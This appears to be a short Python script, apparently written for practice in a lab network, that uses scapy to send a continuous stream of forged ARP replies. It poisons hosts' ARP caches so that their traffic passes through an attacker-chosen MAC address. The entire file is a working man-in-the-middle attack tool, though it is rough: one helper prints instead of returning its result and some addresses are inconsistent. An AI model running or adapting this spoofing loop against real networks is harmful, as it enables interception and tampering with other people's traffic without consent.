#! usr/bin/env python3

from datetime import time
import time as t

import scapy.all as scapy
from scapy.packet import Packet

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request
    (answered_list) = scapy.srp(arp_request_broadcast, timeout = 1, verbose=False)[0]

    print(answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac('10.0.2.4')
    packet = scapy.ARP(op= 2, pdst= target_ip, hwsrc= '08:00:27:08:af:07', psrc= spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet)

while True:
    spoof('10.0.2.2', '10.0.2.3')
    spoof('10.0.2.3', '10.0.2.4')
    t.sleep(2)